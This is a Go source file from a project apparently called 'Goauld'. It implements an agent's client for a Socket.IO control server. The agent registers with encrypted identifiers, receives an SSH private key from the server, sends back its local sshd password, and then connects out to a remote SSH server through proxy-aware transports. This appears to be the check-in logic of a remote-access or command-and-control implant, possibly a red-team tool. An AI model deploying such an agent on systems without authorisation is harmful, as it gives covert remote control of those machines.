package control

import (
	"Goauld/agent/agent"
	"Goauld/agent/proxy"
	"Goauld/agent/ssh"
	"Goauld/common/crypto"
	"Goauld/common/log"
	socketio "Goauld/common/socket.io"
	"context"
	"fmt"
	sio "github.com/karagenc/socket.io-go"
	eio "github.com/karagenc/socket.io-go/engine.io"
	"github.com/quic-go/webtransport-go"
	"nhooyr.io/websocket"
)

func NewClient(ctx context.Context) error {
	cfg := getEioConfig()
	url := agent.Get().SocketIoUrl()
	manager := sio.NewManager(url, cfg)
	socket := manager.Socket("/", nil)

	socket.OnConnect(func() {
		log.Trace().Msg("OnConnect")
		log.Info().Msgf("Connected to the control server %s", url)
	})
	socket.OnConnectError(func(err any) {
		log.Trace().Msg("OnConnectError")
		log.Error().Msgf("Error occured connecting to %s (%v)", url, err)
	})

	manager.OnError(func(err error) {
		log.Trace().Msg("OnError")
		log.Error().Err(err).Msgf("Error occured  %s", url)
	})
	manager.OnReconnect(func(attempt uint32) {
		log.Trace().Msg("OnReconnect")
		log.Warn().Msgf("Reconnected to the control server %s, attempts N° %d", url, attempt)
	})

	socket.OnEvent(socketio.SendSshPrivateKeyEvent, func(data []byte) {
		log.Trace().Msg("OnEvent: SendSshPrivateKeyEvent")
		log.Debug().Msgf("SshPrivateKeyEvent: data reveived")
		privateKey, err := socketio.DecryptSshPrivateKeyMessage(data, agent.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msgf("Error decrypting private key")
		}
		agent.Get().SShPrivateKey = privateKey.SshPrivateKey
		log.Debug().Msgf("Ssh private key received and successfully decrypted")
		log.Debug().Msgf("Sending local sshd password")
		localSshPassword, err := socketio.NewEncryptedAgentSshPasswordMessage(agent.Get().LocalSShdPassword(), agent.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msgf("Error encrypting local sshd password")
		}
		log.Debug().Msgf("Local sshd password sent")
		socket.Emit(socketio.SendAgentSshPasswordEvent, localSshPassword)
		log.Debug().Msgf("Conecting to remote ssh server")
		ssh.Connect()
		log.Warn().Msgf("Conected")

		log.Trace().Msg("OnEvent: SendSshPrivateKeyEvent done")
	})

	socket.OnEvent(socketio.SendSshHPrivateKeyError, func() {
		log.Trace().Msg("OnEvent: SendSshHPrivateKeyError")
		log.Error().Msgf("Error occured (%s) %s", "SendSshHPrivateKeyError", url)
		log.Trace().Msg("OnEvent: SendSshHPrivateKeyError done")
	})

	socket.OnEvent(socketio.SendSshPrivateKeySuccess, func() {
		log.Trace().Msg("OnEvent: SendSshPrivateKeySuccess")
		log.Debug().Msgf("Event SendSshPrivateKeySuccess received")
		log.Trace().Msg("OnEvent: SendSshPrivateKeySuccess done")
	})

	encryptedKey, err := crypto.AsymEncrypt(agent.Get().AgePubKey, agent.Get().SharedSecret)
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %v", err)
	}

	encryptedName, err := crypto.AsymEncrypt(agent.Get().AgePubKey, agent.Get().Name())
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %v", err)
	}

	// This will be emitted after the socket is connected.
	socket.Emit(socketio.RegisterEvent, socketio.Register{
		Id:        agent.Get().Id,
		SharedKey: encryptedKey,
		Name:      encryptedName,
	})

	socket.Connect()
	log.Trace().Msgf("Connected to the control server %s", url)
	log.Trace().Msg("Event send: RegisterEvent")
	select {
	case <-ctx.Done():
		log.Warn().Msgf("Shutting done the socketio control socket")
		socket.Emit(socketio.Disconnect, socketio.DisconnectMessage{})
		log.Trace().Msg("Event send: Disconnect")
		socket.Disconnect()
	}
	return nil
}

func getEioConfig() *sio.ManagerConfig {
	return &sio.ManagerConfig{
		EIO: eio.ClientConfig{
			UpgradeDone: func(transportName string) {
				log.Trace().Msg("Client transport upgrade done")
			},
			HTTPTransport: proxy.NewTransportProxy(),
			WebSocketDialOptions: &websocket.DialOptions{
				HTTPClient: proxy.NewHttpClientProxy(),
			},
			WebTransportDialer: &webtransport.Dialer{
				TLSClientConfig: proxy.NewTlsConfig(),
			},
		},
	}
}
